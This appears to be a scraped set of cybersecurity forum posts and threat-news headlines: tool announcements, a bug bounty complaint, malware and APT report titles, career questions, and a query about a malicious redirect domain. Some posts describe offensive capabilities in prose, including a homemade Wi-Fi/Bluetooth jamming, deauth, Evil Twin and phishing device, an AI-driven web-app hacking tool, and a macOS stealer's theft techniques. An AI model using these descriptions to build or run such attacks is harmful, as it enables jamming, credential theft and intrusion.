+Does it always annoy you that proxy lists published on GitHub stop working shortly after publication and you then have to test the 1000 proxies? This annoyed me a lot, so I wrote a little tool that automates the whole thing. Have a look at it and tell me what could be improved.
+
+Proxy Reaper is a powerful tool for checking proxy servers for availability, speed and anonymity. It supports various protocols such as HTTP, HTTPS, SOCKS4 and SOCKS5 and offers advanced features to efficiently manage and check proxies. You can even use it to test direct source from GitHub and could also run it cron to automate it.
+
+Give me your feedback and wishes. And if you think it's cool you can buy me a coffee.
+
+  
+[https://github.com/rtulke](https://github.com/rtulke)"
+"HackerOne is Ghosting.. Hello hacker friends. My experience so far with HackerOne has been pretty poor. I reported an ATO exploit that chained XSS with 3 other vulnerabilities, but it was closed as a duplicate and linked to a year old report.
+
+I don’t think it is ethical to knowingly leave a critical vulnerability unpatched for such an extended period, and HackerOne does not feel like an honest platform. To avoid paying out bounties, they can just link all future XSS vulnerabilities to the previous report indefinitely because there is no accountability.
+
+The same program claimed to accept subdomain takeovers. [target.com](http://target.com/) is in scope. They reject a takeover on [xyz.target.com](http://xyz.target.com/) due to scope, because it does not explicitly include any wildcards.
+
+I have reported other issues too, but there is always an excuse. While some of the triagers on the platform have done a fantastic job, I suspect others are sharing vulnerabilities with each other. Many of my comments have gone unanswered for months, and my email message was ignored. New accounts on the platform cannot request mediation, thus making it impossible to communicate.
+
+I’m over it. They can keep the bounties, but please fix the vulnerabilities so that millions of users are not jeopardized. I have no idea if the company on HackerOne is even aware of these vulnerabilities and when they intend to fix them. Writing articles on Medium detailing these exploits could also improve my chances of landing a job, but it is impossible to request disclosure ethically when the triagers ghost you. It feels like HackerOne cares more about the monetization of its platform than actually helping customers."
+CrazyHunter: The Rising Threat of Open-Source Ransomware. 
+"Targeted espionage activity UAC-0226 against innovation centers, government and law enforcement agencies using the GIFTEDCROOK stealer (CERT-UA#14303). "
+APT group ToddyCat exploits a vulnerability in ESET for DLL proxying. 
+"[New WTFBin]: SentinelOne - "" legitimate PowerShell script associated with SentinelOne includes encoded PowerShell, AMSI bypass encoding, as well as strings for offensive security commands such as 'Invoke-Mimikatz'. If running another security solution - like Defender - it may flag this"" - agentless. "
+BeaverTail and Tropidoor Malware Distributed via Recruitment Emails. 
+XSS To RCE By Abusing Custom File Handlers - Kentico Xperience CMS (CVE-2025-2748). 
+Grandoreiro Stealer Targeting Spain and Latin America: Malware Analysis and Decryption Insights. 
+Salvador Stealer: Analysis of New Mobile Banking Malware. 
+Exposing Crocodilus: New Device Takeover Malware Targeting Android Devices. 
+"[Technical Paper] GanDiao.sys (ancient kernel driver based malware). Hi all,
+
+I just finished writing this paper. It is about GanDiao.sys, an ancient kernel driver based malware (it only works in WinXP as it is unsigned). 
+
+This driver was used by various malware families and it allowed any userland application to kill other protected processes.
+
+Included in this paper there is also a custom userland app source code to use GanDiao and test its capabilities (just use a sacrifical Windows XP VM as stated in the doc).
+
+English version: [http://lucadamico.dev/papers/malware\_analysis/GanDiao.pdf](http://lucadamico.dev/papers/malware_analysis/GanDiao.pdf)
+
+Italian version: [https://www.lucadamico.dev/papers/malware\_analysis/GanDiao\_ITA.pdf](https://www.lucadamico.dev/papers/malware_analysis/GanDiao_ITA.pdf)
+
+  
+I hope you will find this paper interesting. I had a fun time reverse engineering this sample :) 
+
+Oh, and if you're wondering... yes, I prefer oldschool malware. There's something ""magical"" in these old bins..."
+"The hackers got hacked: Everest ransomware gang's site goes dark. Criminals become victims of crime. Over the weekend, the group's dark web leak site was defaced and is now completely offline. An unknown attacker replaced the website's contents with a sarcastic note: ""Don't do crime CRIME IS BAD xoxo from Prague."" It's still unclear how the site was taken over, but security researcher Tammy Harper suspects it was vulnerable to a WordPress flaw that could have led to the compromise.
+
+The Everest gang has been active for at least five years and has listed over 230 victims on their leak site, focusing on healthcare organizations in the US. Most recently, they had started shifting to a more traditional ransomware model, encrypting files in addition to data theft.
+
+For now, their main platform for extortion is down. Whether they'll resurface elsewhere remains to be seen."
+"Which vendor certification is more marketable for security operations analyst; Splunk,  Microsoft’s SC-200, or Cisco Cybersecurity Associate. I have limited hands-on experience with both Splunk and Microsoft Defender and Sentinel. I have no experience with Cisco security. My Splunk experience comes from doing projects. My experience with MS Defender and Sentinel is a mix of projects and work. 
+
+People often say go with what your org uses. My current employer is a global company. The security operations team uses Defender and Sentinel, but this team is managed by a company called TCS. In fact, we use TCS for all level one support. We do have FTEs that are incident responders but that’s not a role I would be able to pivot into. My employer does have other security teams but getting on those teams are slim as well. For me to get a cybersecurity role, chances are that I’ll have to break away from my employer.
+
+I was thinking about breaking in via IAM since I have more work experience in this, but I find setting up IAM projects rather tedious. The fun part of IAM for me is the technical work and IAM projects seem to be a mix of GRC and technical work. 
+
+Security analysts projects on the other hand have been fun and exciting from the get go so I think this would be a better fit for me. And thus, the above question. If it helps, I have years of experience in IT. I’ve done service desk, help desk, Intune administration and systems administration. I think adding a SIEM and/ SOAR certification to my resume along with the projects I’ve done would improve my chances. 
+"
+WhatsApp vulnerability could be used to infect Windows users with malware (CVE-2025-30401). 
+"Tarantula - Open Source Agentic Web App Hacker PoC. [Tarantula](https://github.com/Trivulzianus/Tarantula) is the culmination of hundreds of dev hours I did in spare time. It is a proof of concept of how a web app hacking tool powered by LLMs could look like.
+
+It has successfully solved multiple PortSwigger labs. I thought about monetizing it somehow, but I actually prefer open sourcing my projects for the community to play with and improve themselves.
+
+Truthfully, between my work and degree, I don't have much time to take it any farther than it is right now. I leave it in your capable hands.
+
+Happy (legal) hacking!"
+"CERT-UA: Targeted espionage activity UAC-0226 against innovation centers, government and law enforcement agencies using the GIFTEDCROOK stealer. "
+"Newly Registered Domains Distributing SpyNote Malware. Hey all - the DomainTools Investigations team published a report this morning detailing a campaign of newly-registered domains impersonating the Google Play store and leading to deployment of the SpyNote Android RAT. No attribution available, but significant Chinese-language connections."
+Shuckworm Targets Foreign Military Mission Based in Ukraine. 
+'ToddyCat' Hackers Exploit ESET Antivirus Flaw to Bypass Windows Security. 
+"Redirected to malicious domain, somehow surpassed browser guard.. Hello everybody,
+
+About a month ago I tried to visit a well known streaming site that I always use. This site has no ads or popups and is generally well trusted. As I typed in the URL and hit enter I got redirected to 'cibago. com/\[random string of letters and numbers\]', then after quickly being redirected to several subdomains I finally landed on the TotalAV product page.
+
+I thought it was weird that TotalAV would be advertising on a piracy website so I went in to my history and clicked the original cibago link I was redirected to, and this time my malwarebytes browser guard blocked it as a phishing link, but for some reason the first time it did not!
+
+I did some research on the domain and literally every resource said the domain was suspicious. [Right here](https://otx.alienvault.com/indicator/file/b1b8951dabe9c42355b347715cd1b0c9cda9652401953c231621c85a3115a0b1) is and [here](https://otx.alienvault.com/indicator/domain/cibago.com) the is the domain on LevelBlue OTX and as you can see it is definitely associated with ransomware and other malware. On the former link it seems that you can see the whole redirect chain, ending on [www.TotalAV.com](http://www.TotalAV.com). [Here](https://www.virustotal.com/gui/domain/cibago.com) you can see the domain is also flagged by 6 vendors on virus total, but they don't specify anything.
+
+I made an any.run account and tried running the domain to see if I can see any drive-by downloads and such, but I just don't have the expertise to understand what I'm seeing. I've since run HitmanPro, Malwarebytes etc. and my device seems clean, but we all know how easy it is to evade antivirus. I also had brave shields on at the time, but I didn't have scripts blocked or anything because it breaks websites, and somehow this redirect evaded my browser guard the first time so who knows.
+
+So my questions are:
+
+1. Why didn't my browser guard stop this the first time?
+2. This domain is associated with malware, should I be worried about drive-by downloads?
+3. If drive-by downloads are associated with this domain, then there may be a ticking time bomb waiting on my PC.... What do?
+
+If anybody who has access to any.run, JoeSandbox or any other analysis tool that actually knows what to look for would be able to run the associated domains to analyze for script injection or drive-by downlaods, that would be much appreciated!! I can't stop thinking about how I was on this clearly suspicious ransomware domain, and that my computer may be actively infected.
+
+Thanks to anybody who's able to help and please let me know if you find anything!
+
+LevelBlue OTX:
+
+[https://otx.alienvault.com/indicator/file/b1b8951dabe9c42355b347715cd1b0c9cda9652401953c231621c85a3115a0b1](https://otx.alienvault.com/indicator/file/b1b8951dabe9c42355b347715cd1b0c9cda9652401953c231621c85a3115a0b1)
+
+[https://otx.alienvault.com/indicator/domain/cibago.com](https://otx.alienvault.com/indicator/domain/cibago.com)
+
+VirusTotal:
+
+[https://www.virustotal.com/gui/domain/cibago.com](https://www.virustotal.com/gui/domain/cibago.com)"
+TROX Stealer: A deep dive into a new Malware as a Service (MaaS) attack campaign. https://sublime.security/blog/trox-stealer-a-deep-dive-into-a-new-malware-as-a-service-maas-attack-campaign
+Suspected Kimsuky (APT-Q-2) attacks South Korean companies. 
+Sapphire Werewolf refines Amethyst stealer to attack energy companies. 
+"Watchtowr. Hey folks,
+
+Has any one had or currently runs the watchtowr attack surface management service?  An independent honest review would be most welcome. A bit concerned they might produce too much noise as a fully automated service. 
+
+My org current uses the bishop fox attack surface monitoring service and while good we have found things they are missing. Particularly infrastructure based stuff (they seem more strong on web app vulnerabilities) and the reporting a vulnerability can be slower than threat actors sometimes for some issues (we have have threat actors exploiting thing within a day of the vulnerability going live)
+
+So we want something that will complement that well. Focused on discovering exploitable vulnerabilities on our internet facing attack surface. Are there any other options we should be considering? "
+"CVE-2025-22457: PoC for CVE-2025-22457 - A remote unauthenticated stack based buffer overflow affecting Ivanti Connect Secure, Pulse Connect Secure, Ivanti Policy Secure, and ZTA Gateway. "
+Is The Sofistication In The Room With Us? - X-Forwarded-For and Ivanti Connect Secure (CVE-2025-22457). 
+"I made a 2.4Ghz Attacker From Scratch !! (WiFi and Bluetooth). Four months ago, I started working on a personal project to test my hardware hacking limits. I bought the boards and began experimenting. Now, after more than 3000 lines of code, I can finally say that Radiosphere is usable. It might have a few bugs here and there, but nothing major.    
+     
+The road wasn’t easy — I burned 2 ESP32 boards, 2 ESP8266s, an Arduino Mega, and even a screen — but it was absolutely worth it.    
+    
+So what is Radiosphere?
+Radiosphere is a multi-purpose wireless attack tool capable of:     
+     
+-Jamming Wi-Fi, Bluetooth, drones, and basically anything using the 2.4GHz band.      
+-Performing deauthentication and Evil Twin attacks.     
+-Spamming fake networks (even custom lists).     
+-Capturing handshake files.     
+     
+And a bunch of side features, such as:
+-Saving previous victims.     
+-Creating and saving custom phishing pages.    
+-Targeted deauth attacks.    
+-Reusing saved phishing pages.    
+And more...    
+    
+    
+I'm genuinely proud of how far it’s come. let me know if you want a github repo or something like that, and thanks for this supportive community."
+"SOC Analyst Inquiry: Part 2. I made a post the other day asking which SIEM certification I should go with; Splunk, SC-200 or Cisco’s Security Associate. 
+
+I want to thank every one who provided me their opinions. I greatly appreciate it. It seemed that most people who responded went with Splunk but SC-200 was a close second. I saw a couple of comments that stated that Cisco was definitely a no go for security. I think out of the three, I’m going to do both Splunk and SC-200. Too much knowledge is never a bad thing right?
+
+After thinking of all this and my career end goal, which is security engineering within cloud or DevSecOps, I forgot to add the AWS Security Specialty certification to the poll. Now, this isn’t a certification one would typically get for a Security Operations Analyst role, but I’m wondering—would being familiar with AWS security be a good thing for a SOC analyst, or is that going a bit overboard? For those of you who are in SOC or cloud security, how often do you deal with AWS security? Is your environment one of AWS, Azure, Google Cloud, multi-cloud, hybrid, or do you use a lot of third party security solutions. 
+
+Sorry for the 21 questions. I’m trying to get all my ducks in a row so I have a clear path and don’t deviate. I want to hit my career end goal by the time I’m 45. I’m 39 now. And for those of you who didn’t read my prior post; I’m not getting into cybersecurity blindly. I’ve been in IT for several years and have experience with things that fall under the security umbrella. I have configured firewalls and VPNs (with minimal help from network engineers) I have configured security settings within Windows and Azure. I have done IAM at a tier 1 level and administrator level (AD, Entra ID and Okta). I have also dealt with governance, risk and compliance (HIPAA). I also educate end users on best practices around phishing, account management and password storage. 
+
+"
+"atomic stealer is 2024’s most aggressive macOS infostealer, here’s why. amos (atomic macos stealer) has been all over 2024—stealing keychains, cookies, browser creds, notes, wallet files, and basically anything not nailed down.
+
+it spreads via fake app installers (arc, photoshop, office) + malvertising, then uses AppleScript to phish for system passwords via fake dialogs.  
+🔹 obfuscated payloads via XOR  
+🔹 keychain + browser data theft  
+🔹 exfil over plain HTTP POST  
+🔹 abuses terminal drag-and-drop to trigger execution  
+🔹 uses `osascript` to look like system prompts
+
+just published a technical breakdown w/ mitre mapping, command examples, and defenses. If you want to read more, [here is the link.](https://www.picussecurity.com/resource/blog/atomic-stealer-amos-macos-threat-analysis)"
+"Script to diagnose SentinelOne install issues. Hey everyone,
+
+While deploying SentinelOne agents across endpoints, I ran into issues and wrote a script to make my life easier. [https://github.com/aseemshaikhok/SentinelOne\_Installation\_Diagnostics](https://github.com/aseemshaikhok/SentinelOne_Installation_Diagnostics)
+
+* Checks for failed installations
+* Pulls relevant log files
+* Diagnoses common issues (e.g., connectivity, agent status, services, WMI, cipher)
+* Provides recommendations
+
+I’ve made it open source on GitHub
+
+Would love feedback, suggestions, or even contributors if this is useful to anyone else!
+
+Cheers,  
+*Aseem*"
+New Malware Variant Identified: ResolverRAT Enters the Maze. 
+"Announcing DefectDojo Integration for our Next-Gen SCA Tool. Introducing DefectDojo Integration allowing vet users to export scan results to DefectDojo. Continue leveraging DefectDojo for your vulnerability management while using vet for identifying vulnerable and malicious open source packages. 
+
+Love to get feedback if this integration is useful for you if you are using DefectDojo for your vulnerability management."
+"Future-Proofing Authentication: Passwordless Strategies for a Hybrid, AI-Driven World. Just came across this upcoming session—looks pretty solid if you’re exploring passwordless for the enterprise. TechDemocracy, AuthID, Yubico, and Ping Identity are teaming up to walk through real-world approaches to modern authentication.
+
+They’re covering things like:
+
+How to evaluate passwordless solutions based on security, UX, and cost. Designing authentication that works across both cloud-native and legacy systems. Real-world use cases involving biometrics, hardware keys, and mobile workforces. And a live demo of PingOne DaVinci tying everything together without needing to code.
+
+Might be worth checking out if you’re working on anything in this space."
